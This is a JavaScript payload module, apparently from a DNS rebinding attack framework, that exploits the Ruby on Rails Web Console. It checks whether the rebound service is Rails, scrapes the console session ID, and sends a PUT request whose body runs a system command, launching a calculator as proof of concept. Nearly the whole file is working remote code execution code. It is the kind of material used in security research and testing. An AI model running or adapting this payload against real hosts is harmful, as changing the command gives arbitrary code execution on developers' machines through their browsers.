/**
This payload is exploiting the Ruby on Rails Web Console (https://github.com/rails/web-console), 
debugging tool for your Ruby on Rails applications.
The exploit performs two RPC requests:
- / : Get request to / to get the web console session ID
- /__web_console/repl_sessions/{SESSION-ID} : PUT request to run the calculator app for a proof of concept
The default RPC port for the rails web console is TCP 3000 (127.0.0.1:3000)

Note: Ruby on Rails 6.0, released in August 2019, protects against DNS rebinding attacks in its default configuration.
https://edgeguides.rubyonrails.org/6_0_release_notes.html#railties-notable-changes
**/

const RailsConsoleRce = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        let myHeaders = new Headers();

        fetch('/nonexistingpage')
            .then(function (response) {
                return response.text()
            })
            .then(function (body) {

                match = body.match(/data-session-id='([^']+)'/);

                if (match === null) {
                    throw new Error('Could not find data-session-id!');
                }

                console.log("data-session-id is " + match[1]);
                let path = "/__web_console/repl_sessions/" + match[1];

                myHeaders.append("Accept", "application/vnd.web-console.v2");
                myHeaders.append("X-Requested-With", "XMLHttpRequest");
                myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

                fetch(path, {
                    method: 'PUT',
                    headers: myHeaders,
                    //body: "input=system(%22calc%22)" // Windows
                    //body: "input=system(%22open%20%2fApplications%2fCalculator.app%26%22)" // OSX
                    //body: "input=system(%22xcalc%26%22)" // Linux (the & (%26) is to execute the command in the background)
                    body: "input=system(%22open%20%2fApplications%2fCalculator.app%26xcalc%26%22)" // OSX & Linux combined ("open /Applications/Calculator.app&xcalc&")
                })
            })
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return fetch("/nonexistingpage",{
            mode: 'no-cors',
            credentials: 'omit',
        })
            .then(function (response) {
                return response.text()
            })
            .then(function (d) {
                if (d.includes("Rails") === true) {
                    return true;
                } else {
                    return false;
                }
            })
            .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Rails Console RCE"] = RailsConsoleRce();



